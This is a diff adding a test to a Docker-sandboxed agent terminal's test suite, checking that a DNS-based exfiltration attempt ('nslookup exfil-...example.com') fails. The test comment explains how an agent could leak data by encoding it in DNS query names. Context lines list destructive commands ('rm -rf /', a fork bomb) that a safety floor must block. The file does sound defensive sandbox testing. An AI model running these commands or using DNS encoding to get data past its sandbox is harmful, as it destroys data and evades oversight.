@@ -118,6 +118,27 @@ describe.skipIf(!dockerAvailable)(`terminal on Docker${gate.skipNote}`, () => {
     expect(result.summary).not.toMatch(/rc=0/);
   }, 180_000);
 
+  it("[SEC-1/D1] cannot resolve an external name over DNS from the egress seat", async () => {
+    // The truthfulness gap the council flagged (D1): `dig/nslookup/host` are routed into the egress
+    // seat (NEEDS_EGRESS), so an agent could exfiltrate by encoding data into a DNS query name that
+    // the embedded resolver forwards upstream. The seat pins its DNS upstream to a loopback sinkhole
+    // (`--dns 127.0.0.1`), so an external name must NOT resolve — it returns SERVFAIL / a failure,
+    // never a real address. 198.51.100.7 in the label is RFC 5737 space, never a real destination.
+    const result = await adapter.execute(
+      'terminal {"command":"nslookup exfil-198-51-100-7.example.com 2>&1; echo rc=$?"}',
+      {},
+    );
+    // nslookup is a NEEDS_EGRESS command, so it ran in the egress seat, not the isolated one.
+    const names = (adapter as unknown as { containerNames(): string[] }).containerNames();
+    expect(names.find((n) => n.includes("egress"))).toBeDefined();
+    // The lookup failed: non-zero rc and a resolver failure, never a resolved answer.
+    expect(result.summary).not.toMatch(/rc=0/);
+    expect(result.summary).toMatch(/SERVFAIL|can't find|can not find|no answer|failure|not found|timed out|timeout|NXDOMAIN/i);
+    // nslookup always echoes its own resolver (`Address: 127.0.0.11:53`); any OTHER Address line
+    // would be a resolved answer.
+    expect(result.summary).not.toMatch(/^Address:\s*(?!127\.0\.0\.11[:#\s])\d+\.\d+\.\d+\.\d+/m);
+  }, 180_000);
+
   it("the floor holds inside execute, i.e. with approval already granted", async () => {
     for (const command of ["rm -rf /", "env rm -rf /", "sh -c 'rm -rf /'", ":(){ :|:& };:"]) {
       const result = await adapter.execute(`terminal ${JSON.stringify({ command })}`, {});
